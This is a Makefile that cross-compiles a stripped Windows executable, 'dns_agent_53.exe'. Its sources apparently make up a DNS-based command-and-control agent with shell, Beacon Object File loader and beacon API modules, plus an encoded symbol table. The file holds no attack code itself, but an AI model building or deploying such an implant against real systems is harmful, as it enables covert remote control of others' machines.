CC = x86_64-w64-mingw32-gcc
CFLAGS = -O2 -s -Wall -fno-ident -fno-asynchronous-unwind-tables \
         -masm=intel -DWIN32_LEAN_AND_MEAN
LDFLAGS = -lws2_32 -ldnsapi -lpsapi -ladvapi32 -static-libgcc

TARGET = dns_agent_53.exe
SRCS = src/main.c src/dns.c src/protocol.c src/commands.c src/shell.c src/bof_loader.c src/beacon_api.c
INCS = -Iinclude -Isrc

SYM_HDR = src/beacon_syms_enc.h

all: $(SYM_HDR) $(TARGET)

$(SYM_HDR): src/gen_sym_table.py
	python3 src/gen_sym_table.py $(SYM_HDR)

$(TARGET): $(SRCS) $(SYM_HDR)
	$(CC) $(CFLAGS) $(INCS) -o $@ $(SRCS) $(LDFLAGS)

clean:
	rm -f $(TARGET) $(SYM_HDR)
